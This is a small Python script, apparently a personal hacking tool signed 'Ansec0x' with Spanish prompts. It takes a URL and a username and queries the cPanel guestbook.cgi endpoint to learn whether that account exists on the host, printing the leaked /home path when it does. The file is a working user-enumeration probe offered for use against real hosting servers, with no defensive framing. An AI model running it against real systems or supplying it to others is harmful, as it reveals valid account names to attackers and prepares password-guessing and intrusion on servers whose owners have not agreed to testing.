import argparse
import os
import requests


def cls():
	os.system('clear')
cls()


data="""\nUsar: pruebas_cpanel.py --url URL --usr USERNAME 
	
   Opciones de Argumentos:
   -h, --help    show this help message and exit
   --url URL     Ingrese URL
   --usr USER    Ingrese Usuario
"""

py=argparse.ArgumentParser(description="Descripcion: Validador de Usuario")
py.add_argument("--url",help="Ingrese URL",required=True)
py.add_argument("--usr",help="Ingrese Usuario",required=True)

parse=py.parse_args()

url=parse.url
usr=parse.usr

if url and usr:
	pass
else:
	print (data)
	print ("Introducir argumento [URL] y [USR] \n")

def verificar_entrada(x):

	if x.startswith("http://"):
		pass
	elif x.startswith("https://"):
		pass
	else:
		print ("\nIngrese Url con [http://] y [https://]\n")

def verificar_url(x,y):
	try:
		if x:
			user=y
			cgi="cgi-sys/guestbook.cgi?user="
			link=x+cgi
			response=requests.get(link)
			response_cgi=response.text
			if 'Not Found' in response_cgi:
				print ("No es Cpanel")
			else:
				link=link+y
				response=requests.get(link)
				response_cgi=response.text
				real="/home/"+y
				if 'Invalid username' in response_cgi:
					print ("[+]Usuario InCorrecto: {}".format(y))
				elif real in response_cgi:
					print ("[+]Usuario Correcto: {}".format(y))
					r=response_cgi.split()
					print(r[4])
					print ("\n")
					banner()


	except requests.exceptions.ConnectionError as e:
		print ("\nError: "+str(e)) 	
		print ("No olvidar ingresar el [/] al final de la URL hosting.com/")
		print ("\n")

def banner():
	true="""SCRIPT By Ansec0x 
	"""
	print (true)


verificar_entrada(url)
verificar_url(url,usr)
